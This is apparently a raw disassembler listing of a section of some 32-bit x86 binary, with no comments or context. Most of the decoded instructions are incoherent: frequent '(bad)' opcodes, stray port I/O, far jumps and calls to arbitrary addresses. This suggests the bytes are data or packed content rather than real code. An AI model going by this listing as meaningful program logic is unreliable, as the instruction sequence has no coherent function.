  409f1b:	frstor [edx+0x6cb8269f]
  409f21:	add    BYTE PTR [ebx],bl
  409f23:	sbb    eax,0xe3af4b02
  409f28:	cmp    dl,BYTE PTR [ebx]
  409f2a:	call   0x4dcf16a9
  409f2f:	sbb    eax,0x31383a69
  409f34:	lods   eax,DWORD PTR ds:[esi]
  409f35:	fild   DWORD PTR [ebx-0x1e]
  409f38:	mov    ebx,0xcf7faa28
  409f3d:	jecxz  0x409f3a
  409f3f:	icebp  
  409f40:	loop   0x409fb8
  409f42:	jne    0x409fb7
  409f44:	lods   eax,DWORD PTR ds:[esi]
  409f45:	test   al,0xc0
  409f47:	jmp    0xdffc:0x33674d6c
  409f4e:	push   eax
  409f4f:	retf   0x7438
  409f52:	sbb    eax,0xf6cf4e81
  409f57:	mov    esp,0x29254a59
  409f5c:	(bad)  
  409f5d:	dec    ecx
  409f5e:	retf   0x5d99
  409f61:	cli    
  409f62:	pushf  
  409f63:	pop    esi
  409f64:	cmp    edi,DWORD PTR [ecx-0x32]
  409f67:	mov    esi,0x5e0c2d74
  409f6c:	lock cmp DWORD PTR [ecx+0x31a45780],ebp
  409f73:	imul   esi,DWORD PTR [ebx+ecx*2+0x5d],0xffffffeb
  409f78:	sbb    al,0xd3
  409f7a:	pop    edx
  409f7b:	mov    esp,0x11be299
  409f80:	sbb    dl,BYTE PTR [edx+0x56]
  409f83:	push   ss
  409f84:	mov    al,0x42
  409f86:	sbb    ecx,DWORD PTR [edi+0x974eb08]
  409f8c:	mov    eax,0x208531c3
  409f91:	add    al,0x9b
  409f93:	pop    edx
  409f94:	out    dx,al
  409f95:	or     al,0xd8
  409f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f98:	push   ebp
  409f99:	add    al,0xf1
  409f9b:	jmp    0x40a00c
  409f9d:	mov    al,0x4d
  409f9f:	not    DWORD PTR [eax+eax*8]
  409fa2:	mov    eax,0x4b7d6392
  409fa7:	bound  ecx,QWORD PTR [ecx]
  409fa9:	jecxz  0x409f42
  409fab:	popf   
  409fac:	or     al,0x16
  409fae:	or     bh,BYTE PTR [esi]
  409fb0:	xor    dh,0xde
  409fb3:	xor    BYTE PTR [edx],bh
  409fb5:	sub    esi,DWORD PTR [edi-0x58]
  409fb8:	into   
  409fb9:	mov    eax,0x1997b948
  409fbe:	shld   DWORD PTR [esi+0x50],ebp,cl
  409fc2:	dec    edx
  409fc3:	ds cli 
  409fc5:	loope  0x40a012
  409fc7:	cwde   
  409fc8:	mov    WORD PTR [esi-0x4b],?
  409fcb:	stos   BYTE PTR es:[edi],al
  409fcc:	add    DWORD PTR [esi+0x5ac5825d],esp
  409fd2:	add    DWORD PTR [eax+edx*8+0xac8485f],ecx
  409fd9:	data16 data16 aam 0xf5
  409fdd:	frstor [edx]
  409fdf:	pop    ds
  409fe0:	and    DWORD PTR [esi+0x5e],esi
  409fe3:	call   0xc44211a2
  409fe8:	inc    ecx
  409fe9:	jb     0x40a028
  409feb:	xchg   BYTE PTR [edx-0x5d3e5c5b],bl
  409ff1:	ret    0x73d5
  409ff4:	scas   eax,DWORD PTR es:[edi]
  409ff5:	add    DWORD PTR [ebx],esi
  409ff7:	push   ds
  409ff8:	mov    cl,0x30
  409ffa:	ds out dx,eax
  409ffc:	cmp    bl,dl
  409ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fff:	xchg   edx,eax
  40a000:	inc    esi
  40a001:	xchg   edx,eax
  40a002:	lods   eax,DWORD PTR ds:[esi]
  40a003:	scas   al,BYTE PTR es:[edi]
  40a004:	cld    
  40a005:	jecxz  0x409fca
  40a007:	loopne 0x409f8e
  40a009:	shr    DWORD PTR [ebx-0x62],1
  40a00c:	leave  
  40a00d:	mov    edx,0x3f3fbec6
  40a012:	sbb    esp,edi
  40a014:	aad    0xc2
  40a016:	mov    ecx,0x10664add
  40a01b:	dec    BYTE PTR [ecx+0x3c95f747]
  40a021:	daa    
  40a022:	xor    DWORD PTR [eax-0x27],ebp
  40a025:	cmc    
  40a026:	adc    DWORD PTR [edi],edx
  40a028:	jle    0x40a048
  40a02a:	loopne 0x409ffc
  40a02c:	push   edi
  40a02d:	sub    al,0xf0
  40a02f:	dec    edi
  40a030:	out    0x31,al
  40a032:	out    0xda,eax
  40a034:	inc    edx
  40a035:	xlat   BYTE PTR ds:[ebx]
  40a036:	sub    BYTE PTR [eax-0x56],ch
  40a039:	jle    0x40a06f
  40a03b:	mov    cl,BYTE PTR [eax+0x7f900576]
  40a041:	push   es
  40a042:	rcr    DWORD PTR [esi+0x373909df],cl
  40a048:	fstp   TBYTE PTR [ecx]
  40a04a:	cmp    eax,esi
  40a04c:	sub    BYTE PTR [ecx-0x2110285],bh
  40a052:	add    ebp,DWORD PTR [ebx]
  40a054:	jmp    0xea30dd5
  40a059:	xchg   esp,eax
  40a05a:	pop    ds
  40a05b:	push   ecx
  40a05c:	into   
  40a05d:	xchg   edx,eax
  40a05e:	add    eax,0xd119df9c
  40a063:	mov    bl,0x4a
  40a065:	xchg   ebp,eax
  40a066:	or     ecx,ebx
  40a068:	jecxz  0x40a0dc
  40a06a:	jmp    0x641c:0x55196f2c
  40a071:	imul   eax,DWORD PTR [ecx+0x15f22faf],0x60
  40a078:	jmp    FWORD PTR [ecx]
  40a07a:	aaa    
  40a07b:	test   DWORD PTR [bx],edx
  40a07e:	xor    BYTE PTR [eax-0x6f],dl
  40a081:	dec    ecx
  40a082:	sbb    eax,0x95849ff6
  40a087:	cmp    BYTE PTR [ecx],ah
  40a089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a08a:	push   ss
  40a08b:	adc    ah,BYTE PTR [ecx-0x6220a1d8]
  40a091:	dec    esi
  40a092:	and    ah,dh
  40a094:	iret   
  40a095:	and    BYTE PTR [ebp-0x1303009a],ah
  40a09b:	out    0x88,eax
  40a09d:	lock call 0x9216:0x22d0dd84
  40a0a5:	xchg   ebx,eax
  40a0a6:	xor    al,0xe8
  40a0a8:	sub    bh,BYTE PTR [edx]
  40a0aa:	xchg   edx,eax
  40a0ab:	sub    al,0xf3
  40a0ad:	std    
  40a0ae:	mov    bl,0x4d
  40a0b0:	(bad)  
  40a0b1:	retf   
  40a0b2:	int3   
  40a0b3:	arpl   WORD PTR [eax],bx
  40a0b5:	loope  0x40a041
  40a0b7:	xchg   edi,eax
  40a0b8:	and    DWORD PTR [ebp+0x1b],0x4f26cb34
  40a0bf:	mov    ah,0x54
  40a0c1:	fnsave [edx-0xbd34812]
  40a0c7:	or     eax,0x5e3b880d
  40a0cc:	jmp    0x40a04f
  40a0ce:	mov    BYTE PTR [eax+0xb],dh
  40a0d1:	gs out 0xdd,al
  40a0d4:	jne    0x40a061
  40a0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0d7:	in     eax,0x98
  40a0d9:	dec    edi
  40a0da:	xor    BYTE PTR fs:[edi+0x50],bh
  40a0de:	or     esp,DWORD PTR [eax]
  40a0e0:	pop    edi
  40a0e1:	addr16 push esi
  40a0e3:	test   al,0x50
  40a0e5:	ret    
  40a0e6:	sub    BYTE PTR [ebx-0x4431d716],cl
  40a0ec:	sub    dh,BYTE PTR [edi+0x51]
  40a0ef:	push   es
  40a0f0:	adc    esp,ebx
  40a0f2:	and    al,0x85
  40a0f4:	pop    edx
  40a0f5:	or     BYTE PTR [ecx],dl
  40a0f7:	repz add DWORD PTR [esi],ecx
  40a0fa:	out    0x1f,al
  40a0fc:	mov    ecx,0xa501f33
  40a101:	pusha  
  40a102:	cmc    
  40a103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a104:	add    esi,ebp
  40a106:	lahf   
  40a107:	fld    TBYTE PTR [ecx]
  40a109:	not    DWORD PTR [edx-0x3ec13bef]
  40a10f:	mov    edi,0x387c2988
  40a114:	push   0xc
  40a116:	js     0x40a09d
  40a118:	aad    0xda
  40a11a:	adc    al,0x61
  40a11c:	cmp    bh,BYTE PTR [eax+edx*4]
  40a11f:	and    BYTE PTR [edi+0x20],dl
  40a122:	out    0x9c,al
  40a124:	inc    esp
  40a125:	stc    
  40a126:	cdq    
  40a127:	add    DWORD PTR [esi],eax
  40a129:	not    BYTE PTR [edx-0x3f]
  40a12c:	test   DWORD PTR [edi-0x50fcd54b],0x325919e8
  40a136:	dec    ebp
  40a137:	pop    es
  40a138:	enter  0xe213,0x58
  40a13c:	(bad)  
  40a13d:	mov    esp,0xbf6fbeff
  40a142:	inc    ecx
  40a143:	push   edx
  40a144:	push   ebx
  40a145:	jmp    0xb89ffd21
  40a14a:	jecxz  0x40a0d1
  40a14c:	out    0x3e,eax
  40a14e:	or     al,0x89
  40a150:	xlat   BYTE PTR ds:[ebx]
  40a151:	(bad)  
  40a152:	mov    al,ds:0x3833dc2b
  40a157:	fst    QWORD PTR [ebx+0x45]
  40a15a:	sub    edx,esp
  40a15c:	sbb    edx,DWORD PTR [ebp+eiz*2+0x13fafcec]
  40a163:	push   esp
  40a164:	test   dl,al
  40a166:	out    0x87,al
  40a168:	jnp    0x40a1bb
  40a16a:	adc    DWORD PTR [edx-0x5a],0x43afdf49
  40a171:	push   cs
  40a172:	(bad)
  40a175:	xchg   ebx,eax
  40a176:	inc    edx
  40a177:	fild   WORD PTR [ebp-0x16]
  40a17a:	mov    BYTE PTR [edi-0xc],bh
  40a17d:	fcom   QWORD PTR [edx+0x23]
  40a180:	push   esp
  40a181:	in     al,dx
  40a182:	xor    edx,DWORD PTR [edi-0x52]
  40a185:	cmc    
  40a186:	fstp   QWORD PTR [eax]
  40a188:	pushf  
  40a189:	dec    ecx
  40a18a:	mov    edx,0xe99a5de1
  40a18f:	popf   
  40a190:	out    dx,eax
  40a191:	aam    0xf0
  40a193:	xchg   ecx,eax
  40a194:	sub    BYTE PTR ds:0x933c32cc,dh
  40a19a:	jl     0x40a120
  40a19c:	push   esp
  40a19d:	mov    edi,DWORD PTR [esi]
  40a19f:	mov    bl,0x75
  40a1a1:	mov    ds:0x7b9ddbaa,al
  40a1a6:	loop   0x40a225
  40a1a8:	call   0xe67be2c8
  40a1ad:	sbb    ah,ah
  40a1af:	add    al,0x1b
  40a1b1:	ins    BYTE PTR es:[edi],dx
  40a1b2:	dec    edi
  40a1b3:	sahf   
  40a1b4:	adc    al,0x2
  40a1b6:	in     al,0xdb
  40a1b8:	push   0x6
  40a1ba:	sub    DWORD PTR [esi],0x1
  40a1bd:	jecxz  0x40a16e
  40a1bf:	scas   eax,DWORD PTR es:[edi]
  40a1c0:	jle    0x40a1c3
  40a1c2:	hlt    
  40a1c3:	pop    edx
  40a1c4:	pop    ebp
  40a1c5:	adc    eax,0x636a1102
  40a1ca:	mov    ah,ah
  40a1cc:	dec    esi
  40a1cd:	leave  
  40a1ce:	js     0x40a19e
  40a1d0:	xchg   edi,eax
  40a1d1:	push   edi
  40a1d2:	dec    esp
  40a1d3:	outs   dx,BYTE PTR ds:[esi]
  40a1d4:	inc    edi
  40a1d5:	mov    al,0xe2
  40a1d7:	das    
  40a1d8:	inc    ecx
  40a1d9:	iret   
  40a1da:	jae    0x40a191
  40a1dc:	out    0x99,al
  40a1de:	sub    BYTE PTR [esi-0x7cd66848],al
  40a1e4:	retf   
  40a1e5:	jb     0x40a19a
  40a1e7:	imul   edi,DWORD PTR fs:[ebp+0x4c6f6d68],0x75
  40a1ef:	xchg   cl,al
  40a1f1:	push   cs
  40a1f2:	mov    eax,ds:0x2d804e41
  40a1f7:	in     al,0x4b
  40a1f9:	fild   QWORD PTR [ebp-0x74]
  40a1fc:	(bad)  
  40a1fd:	xor    al,0x82
  40a1ff:	test   al,0x3e
  40a201:	into   
  40a202:	lods   eax,DWORD PTR ds:[esi]
  40a203:	xchg   edx,eax
  40a204:	jbe    0x40a1be
  40a206:	cmp    al,0x44
  40a208:	scas   al,BYTE PTR es:[edi]
  40a209:	imul   BYTE PTR [ebx]
  40a20b:	xchg   ebx,eax
  40a20c:	(bad)  
  40a20d:	mov    ds:0x50613676,eax
  40a212:	sbb    ecx,edi
  40a214:	or     al,0xc5
  40a216:	xlat   BYTE PTR ds:[ebx]
  40a217:	jnp    0x40a1ad
  40a219:	dec    edx
  40a21a:	scas   al,BYTE PTR es:[edi]
  40a21b:	jle    0x40a211
  40a21d:	pop    edx
  40a21e:	or     al,0x4e
  40a220:	mov    esi,0x95fb542c
  40a225:	inc    esi
  40a226:	lea    edx,[ebx+0x7f0730d0]
  40a22c:	xchg   eax,eax
  40a22e:	jns    0x40a21b
  40a230:	dec    esi
  40a231:	and    BYTE PTR [eax-0x18ee5311],bl
  40a237:	sahf   
  40a238:	sub    DWORD PTR [ebx],0xc14a16d3
  40a23e:	shl    DWORD PTR [edi+0x4f],cl
  40a241:	lea    edx,[ebx-0x8]
  40a244:	test   al,0xc8
  40a246:	cli    
  40a247:	sub    eax,0x173a5849
  40a24c:	push   ss
  40a24d:	mov    esi,0x9d6ac043
  40a252:	ss jne 0x40a1ec
  40a255:	push   ebp
  40a256:	arpl   cx,sp
  40a258:	push   ecx
  40a259:	popa   
  40a25a:	xchg   edx,eax
  40a25b:	fsubr  QWORD PTR [eax]
  40a25d:	push   ebx
  40a25e:	outs   dx,DWORD PTR ds:[esi]
  40a25f:	sub    ebx,DWORD PTR [ebx-0x74]
  40a262:	test   BYTE PTR [esi-0x2a86090d],bl
  40a268:	jmp    0xd020:0x912c07e3
  40a26f:	cmp    esp,DWORD PTR [esi-0x47]
  40a272:	jmp    0x40a22a
  40a274:	cwde   
  40a275:	js     0x40a2e5
  40a277:	sub    ch,BYTE PTR [ebp-0x40ed0001]
  40a27d:	pop    esp
  40a27e:	pusha  
  40a27f:	xor    edi,0x6e
  40a282:	aas    
  40a283:	jbe    0x40a25d
  40a285:	test   eax,0xf41697cd
  40a28a:	ror    BYTE PTR [edi-0x5f],1
  40a28d:	sti    
  40a28e:	aaa    
  40a28f:	pop    ss
  40a290:	data16 cli 
  40a292:	mov    eax,ds:0x2cb27eb2
  40a297:	(bad)  
  40a298:	cmp    dl,BYTE PTR [ecx]
  40a29a:	mov    dl,0x35
  40a29c:	add    BYTE PTR [edx],bl
  40a29e:	jmp    FWORD PTR [eax-0x33]
  40a2a1:	(bad)  
  40a2a2:	jbe    0x40a236
  40a2a4:	cmc    
  40a2a5:	inc    DWORD PTR [ecx]
  40a2a7:	rcr    DWORD PTR [esi],0x57
  40a2aa:	nop
  40a2ab:	push   es
  40a2ac:	adc    eax,0xbac9402d
  40a2b1:	jb     0x40a26c
  40a2b3:	test   ecx,0x61c8628c
  40a2b9:	jne    0x40a2ba
  40a2bb:	adc    al,0xde
  40a2bd:	sub    eax,ebx
  40a2bf:	push   esp
  40a2c0:	aam    0x76
  40a2c2:	icebp  
  40a2c3:	and    BYTE PTR [ebp-0x50],cl
  40a2c6:	pushf  
  40a2c7:	ins    BYTE PTR es:[edi],dx
  40a2c8:	inc    esi
  40a2c9:	sub    eax,0x68c7289
  40a2ce:	xchg   ebp,eax
  40a2cf:	cmp    BYTE PTR [ebx-0x7],al
  40a2d2:	ficomp DWORD PTR [ebx]
  40a2d4:	dec    ecx
  40a2d5:	add    edx,ebp
  40a2d7:	loopne 0x40a28d
  40a2d9:	sbb    DWORD PTR [ebp-0x2890d030],ebp
  40a2df:	(bad)  
  40a2e0:	int3   
  40a2e1:	vaddss xmm0,xmm2,xmm0
  40a2e5:	sub    DWORD PTR [ebp-0x9f9805e],edi
  40a2eb:	(bad)  
  40a2ec:	sub    BYTE PTR ds:0x5c3b55c,ah
  40a2f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2f3:	and    al,0x56
  40a2f5:	test   BYTE PTR [esi+0x3f],dh
  40a2f8:	mov    ebx,0x85c12f44
  40a2fd:	inc    esp
  40a2fe:	repz ret 
  40a300:	adc    BYTE PTR [ecx+0x5],al
  40a303:	pop    DWORD PTR [eax]
  40a305:	mov    ebx,0x8942e334
  40a30a:	addr16 lock push esi
  40a30d:	and    ebx,DWORD PTR [edi]
  40a30f:	repnz vpcmpeqw xmm3,xmm4,XMMWORD PTR [edi+ebx*8-0x42252462]
  40a319:	ins    BYTE PTR es:[edi],dx
  40a31a:	daa    
  40a31b:	dec    esp
  40a31c:	dec    ebx
  40a31d:	ss push cs
  40a31f:	retf   0x656d
  40a322:	sbb    esp,DWORD PTR [ebx+ebx*1+0x4b4c92f5]
  40a329:	and    eax,0x9380e650
  40a32e:	aas    
  40a32f:	int3   
  40a330:	cmp    al,0x33
  40a332:	push   0xffffffee
  40a334:	pop    ecx
  40a335:	(bad)  
  40a336:	cmp    al,0x4c
  40a338:	call   0xe75e8840
  40a33d:	jecxz  0x40a3ab
  40a33f:	retf   0x2a23
  40a342:	(bad)  
  40a343:	rcr    BYTE PTR [eax+0x3c],0x86
  40a347:	inc    edx
  40a348:	xlat   BYTE PTR ds:[ebx]
  40a349:	push   eax
  40a34a:	test   al,0x26
  40a34c:	pop    edx
  40a34d:	jle    0x40a2d7
  40a34f:	je     0x40a368
  40a351:	call   0x5727cc45
  40a356:	mul    DWORD PTR [esi-0x11aad96e]
  40a35c:	add    eax,0xd69d1bd7
  40a361:	mov    eax,DWORD PTR [esi+edi*4+0x4e]
  40a365:	cwde   
  40a366:	stos   DWORD PTR es:[edi],eax
  40a367:	xchg   BYTE PTR [eax],al
  40a369:	int3   
  40a36a:	test   eax,0xb932360b
  40a36f:	jmp    0xb5b064ae
  40a374:	xchg   ebx,eax
  40a375:	inc    esi
  40a376:	inc    ebx
  40a377:	aas    
  40a378:	mov    ebx,0x5ecb4e43
  40a37d:	add    dl,ah
  40a37f:	sub    cl,dl
  40a381:	arpl   bx,di
  40a383:	adc    al,0xd7
  40a385:	jge    0x40a36f
  40a387:	or     BYTE PTR [edi-0x4f],0x1
  40a38b:	cwde   
  40a38c:	inc    esi
  40a38d:	lea    edx,gs:[edx-0x30]
  40a391:	out    0x92,eax
  40a393:	dec    esp
  40a394:	(bad)  
  40a395:	xchg   edi,eax
  40a396:	ja     0x40a3e6
  40a398:	data16 (bad) 
  40a39a:	fnsave [ebx-0x20]
  40a39d:	and    al,0x59
  40a39f:	imul   ebp,DWORD PTR [edx-0x3c120642],0x5f9c8666
  40a3a9:	push   ecx
  40a3aa:	lea    ebx,ds:0x120dcca
  40a3b0:	dec    ebx
  40a3b1:	mov    BYTE PTR [eax+0x236c51fc],cl
  40a3b7:	pop    ecx
  40a3b8:	sar    ebx,1
  40a3ba:	imul   BYTE PTR [edi+0x7434e15e]
  40a3c0:	fistp  WORD PTR [edi+0x20b2408a]
  40a3c6:	mov    edi,0x483cbf5a
  40a3cb:	arpl   WORD PTR [ebx-0x4a],di
  40a3ce:	mov    ds:0x18a6632e,eax
  40a3d3:	fist   WORD PTR [ebp+0x6143d898]
  40a3d9:	cmp    edx,esi
  40a3db:	je     0x40a3e6
  40a3dd:	mov    esp,0x46ec8d8a
  40a3e2:	cdq    
  40a3e3:	push   cs
  40a3e4:	std    
  40a3e5:	fdivp  st(2),st
  40a3e7:	fidiv  DWORD PTR [edi]
  40a3e9:	fnstcw WORD PTR [edi]
  40a3eb:	fsub   st(3),st
  40a3ed:	or     BYTE PTR [edx],ah
  40a3ef:	xor    DWORD PTR [ebp-0x7fbbd34d],ebp
  40a3f5:	ins    BYTE PTR es:[edi],dx
  40a3f6:	sbb    bh,al
  40a3f8:	xchg   edi,eax
  40a3f9:	mov    ebp,0x7e553f48
  40a3fe:	mov    ebx,0x33eb8ab8
  40a403:	inc    esp
  40a404:	xchg   edi,eax
  40a405:	mov    bh,0x63
  40a407:	(bad)  
  40a409:	stos   DWORD PTR es:[edi],eax
  40a40a:	cmp    eax,0x2dd4b1b9
  40a40f:	sti    
  40a410:	pop    es
  40a411:	rcr    cl,0xa9
  40a414:	not    dh
  40a416:	xlat   BYTE PTR ds:[ebx]
  40a417:	xor    eax,0xb3fed968
  40a41c:	ds pop es
  40a41e:	loopne 0x40a474
  40a420:	add    DWORD PTR [edx+0x36],ebx
  40a423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a424:	lds    eax,FWORD PTR [eax+ebx*1+0x78]
  40a428:	in     eax,dx
  40a429:	mov    ?,WORD PTR [esi+0x6fde65f0]
  40a42f:	pusha  
  40a430:	lds    edx,FWORD PTR [ebx+ecx*4]
  40a433:	rcr    DWORD PTR [ecx-0x78],cl
  40a436:	push   ebx
  40a437:	sbb    ch,BYTE PTR [ecx-0x4d]
  40a43a:	data16 loopne 0x40a415
  40a43d:	xor    BYTE PTR [ecx-0x238e0c7f],0x7
  40a444:	pop    esp
  40a445:	xchg   edi,eax
  40a446:	cs inc edi
  40a448:	pushf  
  40a449:	imul   BYTE PTR [edx]
  40a44b:	scas   eax,DWORD PTR es:[edi]
  40a44c:	mov    esp,0x88ca9ee8
  40a451:	jmp    0x9de6d09a
  40a456:	mov    ebx,0x17553f86
  40a45b:	(bad)  
  40a45c:	push   0x6d
  40a45e:	fsubr  QWORD PTR [edx+0x19]
  40a461:	mov    al,ds:0x95245612
  40a466:	adc    DWORD PTR [esi],ebp
  40a468:	mov    ah,0x9e
  40a46a:	fisttp DWORD PTR [edi+0x38fb3a36]
  40a470:	ror    BYTE PTR [eax],0x49
  40a473:	out    dx,eax
  40a474:	xchg   edi,eax
  40a475:	daa    
  40a476:	enter  0xa7e0,0x62
  40a47a:	icebp  
  40a47b:	xor    eax,0x67486a29
  40a480:	inc    esi
  40a481:	enter  0xbf69,0xe3
  40a485:	ss popa 
  40a487:	and    ch,BYTE PTR [eax+ecx*2]
  40a48a:	pop    esp
  40a48b:	fcmovnu st,st(7)
  40a48d:	pop    edx
  40a48e:	xchg   esi,eax
  40a48f:	jp     0x40a4b1
  40a491:	xchg   edx,eax
  40a492:	sub    esi,ebx
  40a494:	or     al,0xd2
  40a496:	or     al,BYTE PTR [eax]
	...
  40a514:	adc    eax,0x96f91681
  40a519:	(bad)  
  40a51a:	(bad)  
  40a51b:	in     eax,dx
  40a51c:	push   eax
  40a51d:	scas   eax,DWORD PTR es:[edi]
  40a51e:	(bad)  
  40a51f:	jp     0x40a53e
  40a521:	push   ebx
  40a522:	shl    DWORD PTR [edi],cl
  40a524:	push   ebx
  40a525:	push   edi
  40a526:	add    BYTE PTR [eax],al
  40a528:	imul   eax,DWORD PTR [edi],0x0
  40a52b:	add    BYTE PTR [ecx],cl
  40a52d:	and    DWORD PTR [ecx+eax*8-0x6ce7b852],ebp
  40a534:	aad    0x50
  40a536:	in     eax,dx
  40a537:	xchg   DWORD PTR [ebp+0x1d1f1b3e],esp
  40a53d:	pop    es
  40a53e:	and    DWORD PTR [ecx+0x15598289],esi
  40a544:	and    DWORD PTR [ecx],eax
  40a546:	push   esi
  40a547:	cdq    
  40a548:	xchg   ecx,eax
  40a549:	data16 cmp al,0xee
  40a54c:	jmp    0x40a542
  40a54e:	rol    BYTE PTR [esi+0x3b],1
  40a551:	in     eax,dx
  40a552:	or     DWORD PTR [edi],eax
  40a554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a555:	jno    0x40a516
  40a557:	rol    ah,0x8
  40a55a:	outs   dx,DWORD PTR ds:[esi]
  40a55b:	cmp    cl,al
  40a55d:	sbb    cl,BYTE PTR ds:0x524ba4c4
  40a563:	rcl    ebp,cl
  40a565:	popa   
  40a566:	mov    dh,0x92
  40a568:	dec    ebp
  40a569:	cli    
  40a56a:	or     ebx,eax
  40a56c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a56d:	dec    edi
  40a56e:	and    al,0x72
  40a570:	mov    ds:0x18b88876,eax
  40a575:	daa    
  40a576:	xor    esp,DWORD PTR [eax-0x4b1dcec7]
  40a57c:	push   edx
  40a57d:	add    edx,DWORD PTR [esi-0x49da6eef]
  40a583:	(bad)  
  40a584:	adc    al,0x31
  40a586:	mov    edi,DWORD PTR [edx-0x2d]
  40a589:	sbb    ecx,0x49
  40a58c:	inc    ebp
  40a58d:	mov    cl,0xc6
  40a58f:	inc    esp
  40a590:	sbb    eax,DWORD PTR [ebp+0x15]
  40a593:	jo     0x40a5ef
  40a595:	add    dh,BYTE PTR [eax-0x2ef62c27]
  40a59b:	xor    BYTE PTR [ebx-0x29],cl
  40a59e:	ret    
  40a59f:	add    BYTE PTR [eax+0x274da998],0x27
  40a5a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5a7:	mov    cl,0xdb
  40a5a9:	mov    ecx,0x24fb3dbb
  40a5ae:	data16 hlt 
  40a5b0:	inc    esp
  40a5b1:	lods   eax,DWORD PTR ds:[esi]
  40a5b2:	xchg   ebx,eax
  40a5b3:	mov    ah,0x8a
  40a5b5:	dec    esp
  40a5b6:	popa   
  40a5b7:	ja     0x40a5d5
  40a5b9:	call   0xdef3:0x587c84f9
  40a5c0:	adc    esp,DWORD PTR [ebp+0x3ab41a2f]
  40a5c6:	cld    
  40a5c7:	sbb    dh,BYTE PTR [eax]
  40a5c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5ca:	shr    ah,cl
  40a5cc:	es scas eax,DWORD PTR es:[edi]
  40a5ce:	mov    ebx,0x805e1138
  40a5d3:	xchg   esp,eax
  40a5d4:	mov    ebx,0x1fcd4747
  40a5d9:	cmc    
  40a5da:	sbb    ebp,DWORD PTR ds:0xe61
  40a5df:	jle    0x40a5ea
  40a5e1:	cmc    
  40a5e2:	dec    DWORD PTR [esp+eax*8+0x9ce12f0]
  40a5e9:	cmp    BYTE PTR [edx],ah
  40a5eb:	popa   
  40a5ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5ed:	in     al,0x6a
  40a5ef:	sub    BYTE PTR [eax-0x6ee0db78],al
  40a5f5:	pop    ebx
  40a5f6:	mov    edx,0x4c394572
  40a5fb:	(bad)
  40a5fe:	pmaddwd mm5,QWORD PTR [esi-0x76d2a3d0]
  40a605:	fdivrp st(7),st
  40a607:	repnz add BYTE PTR [esi+0x69],ah
  40a60b:	sub    al,0x55
  40a60d:	xor    ebp,DWORD PTR [eax+eax*2]
  40a610:	sbb    DWORD PTR [edx-0x19],esp
  40a613:	ds std 
  40a615:	mov    dh,cl
  40a617:	xchg   edx,eax
  40a618:	adc    eax,0x84012183
  40a61d:	fild   QWORD PTR [edx+0x719bb0f6]
  40a623:	xchg   ebp,eax
  40a624:	jg     0x40a5df
  40a626:	imul   edx,DWORD PTR [esi+ebx*2],0xdc1fa2bf
  40a62d:	cmp    al,0x59
  40a62f:	mov    dl,0x38
  40a631:	iret   
  40a632:	hlt    
  40a633:	data16 sub BYTE PTR [ecx-0x44028d39],0x49
  40a63b:	dec    ecx
  40a63c:	(bad)  
  40a63d:	xchg   ebx,eax
  40a63e:	xchg   cl,bh
  40a640:	mov    eax,0x7c4b6ab1
  40a645:	(bad)  
  40a646:	rcl    DWORD PTR [edx-0x13b9be4a],1
  40a64c:	fdivr  DWORD PTR [esi+0x65]
  40a64f:	adc    esp,DWORD PTR [esp+esi*8+0x10517623]
  40a656:	mov    dl,0xf4
  40a658:	neg    BYTE PTR [ebx+0x1f393742]
  40a65e:	add    DWORD PTR [edx],ecx
  40a660:	cmc    
  40a661:	cmp    esp,DWORD PTR [edi+ecx*8]
  40a664:	mov    BYTE PTR [ecx],bl
  40a666:	faddp  st(1),st
  40a668:	fisttp WORD PTR [esi-0x27]
  40a66b:	in     eax,dx
  40a66c:	pop    ds
  40a66d:	jns    0x40a6b6
  40a66f:	popa   
  40a670:	inc    edx
  40a671:	add    BYTE PTR [edx+edx*2-0x73bd3a13],dl
  40a678:	pop    es
  40a679:	test   cl,dh
  40a67b:	fdivr  QWORD PTR [edi+0xc]
  40a67e:	cmp    eax,0xa275d647
  40a683:	mov    cs:0x4afa7a96,al
  40a689:	mov    al,0xee
  40a68b:	push   ecx
  40a68c:	inc    edi
  40a68d:	das    
  40a68e:	out    0x53,eax
  40a690:	jne    0x40a678
  40a692:	imul   ebp,DWORD PTR [edi+0x2f163638],0xffffffa5
  40a699:	test   eax,0x33f865f7
  40a69e:	mov    ecx,0xce4d0a64
  40a6a3:	pusha  
  40a6a4:	cmc    
  40a6a5:	in     eax,0x4c
  40a6a7:	sbb    DWORD PTR [ebp+0x7a7b4feb],edx
  40a6ad:	test   al,0xd2
  40a6af:	push   cs
  40a6b0:	add    eax,0x568ea6ae
  40a6b5:	inc    ebp
  40a6b6:	ja     0x40a6a8
  40a6b8:	inc    edx
  40a6b9:	stos   DWORD PTR es:[edi],eax
  40a6ba:	pop    edi
  40a6bb:	gs mov bh,0x81
  40a6be:	jl     0x40a736
  40a6c0:	addr16 stc 
  40a6c2:	(bad)
  40a6c5:	shl    DWORD PTR [ebp+0x5a],cl
  40a6c8:	jno    0x40a6ed
  40a6ca:	mov    DWORD PTR [ecx+0x3ad92622],ebx
  40a6d0:	add    ebx,edi
  40a6d2:	ret    0x97ed
  40a6d5:	ret    0xd49b
  40a6d8:	aaa    
  40a6d9:	sahf   
  40a6da:	outs   dx,DWORD PTR ds:[esi]
  40a6db:	out    dx,eax
  40a6dc:	mov    gs,WORD PTR [ecx]
  40a6de:	dec    ecx
  40a6df:	iret   
  40a6e0:	bound  ecx,QWORD PTR [ecx+0xcc78f15]
  40a6e6:	inc    ecx
  40a6e7:	loopne 0x40a732
  40a6e9:	mov    WORD PTR [edi+ecx*2+0x2c],gs
  40a6ed:	inc    ebp
  40a6ee:	inc    edi
  40a6ef:	sbb    al,0x69
  40a6f1:	(bad)  
  40a6f2:	or     al,0x50
  40a6f4:	popa   
  40a6f5:	inc    esp
  40a6f6:	and    edi,esi
  40a6f8:	sbb    ebx,eax
  40a6fa:	inc    edi
  40a6fb:	pop    es
